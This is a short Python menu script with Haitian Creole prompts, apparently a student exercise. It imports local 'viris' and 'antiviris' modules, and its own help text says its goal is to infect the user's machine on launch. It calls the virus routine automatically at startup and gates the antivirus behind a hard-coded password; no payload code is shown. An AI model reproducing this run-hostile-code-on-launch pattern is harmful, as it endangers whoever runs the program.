import menu 
import antiviris
import viris
import os
import platform
os1 = platform.system()


viris.viris_mwen()
while True:
    menu.menu1()
    opsyon = int(input('Entre opsyon u vle a: '))
    menu.clear()

    if opsyon == 1:
        t = 3  
        p = 'user'
        
        while t > 0:
            print(f'Tape {p} svp')
            mot_de_passe = input('Mot de passe: ') 
            menu.clear()
            t -=1
           
            if mot_de_passe == p:
                    
                antiviris.antiviris_mwen()
            

               

        
                break
            else:
                print(f'Ou rete {t} esey')
    
    elif opsyon == 2:
        viris.viris_mwen() 
    

    elif opsyon == 3:
        print("================================================")
        print('Bonjour ou Bonsoir tou depan de le aksan grav kew wap li\n'
              'Wap li info sa yo objektif program sa se infekte\n'
              'machin itilizate a le li lanse program sa, lap possiblite poul ' 
              'lanse antiviris la kote ke yap mandel mot passe lap gn selman 3 esey\n'
              'apre 3 tantative echwe program nan ap kanpe.')
        print("================================================")
    elif opsyon == 0:
        break
    else:
        print('Opsyon ou antre a pa valid')
    
print("==================================================")
print('  Mesi deske t chwazi itilize pwogram nou an!!!!')
print("==================================================")


